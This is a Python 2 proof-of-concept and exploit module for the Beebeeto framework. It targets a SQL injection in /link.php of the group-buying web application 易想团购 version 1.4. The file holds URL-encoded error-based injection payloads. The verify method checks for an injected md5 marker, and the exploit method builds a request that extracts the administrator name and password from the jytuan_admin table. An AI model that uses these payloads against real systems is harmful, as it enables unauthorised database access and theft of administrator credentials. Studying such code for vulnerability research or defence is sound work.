#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0179',
            'name': '易想团购 v1.4 /link.php SQL注入漏洞 POC & Exploit',
            'author': 'tmp',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '易想团购',
            'vul_version': ['1.4'],
            'type': 'SQL Injection',
            'tag': ['易想团购漏洞', 'SQL注入漏洞', '/link.php', 'php'],
            'desc': 'N/A',
            'references': [
                'http://www.2cto.com/Article/201308/234400.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/link.php?act=go&url=%27%29%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73"
                   "%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74"
                   "%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C"
                   "%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F"
                   "%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30"
                   "%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69"
                   "%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75"
                   "%70%20%62%79%20%78%29%61%29%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if '63e1f04640e83605c1d177544a5a0488' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        payload_tmp = ("/link.php?act=go&url=%27%29%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73"
           "%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74"
           "%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C"
           "%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F"
           "%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30"
           "%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69"
           "%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75"
           "%70%20%62%79%20%78%29%61%29%23")
        verify_url_tmp = args['options']['target'] + payload_tmp
        req_tmp = urllib2.Request(verify_url_tmp)
        content_tmp = urllib2.urlopen(req_tmp).read()
        if args['options']['verbose']:
            print '[*] verify_url_tmp...'
            print '[*] Request URL: ' + verify_url_tmp
        if '63e1f04640e83605c1d177544a5a0488' in content_tmp:
            payload = ("/link.php?act=go&city=sanming&url=secer%27%29%20and%20%28updatexml%281%2Cconcat%280x3a"
                       "%2C%28select%20concat%28adm_name%2C0x3a%2Cadm_password%29%20from%20jytuan_admin%20limit"
                       "%201%29%29%2C1%29%29%2523")
            verify_url = args['options']['target'] + payload
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())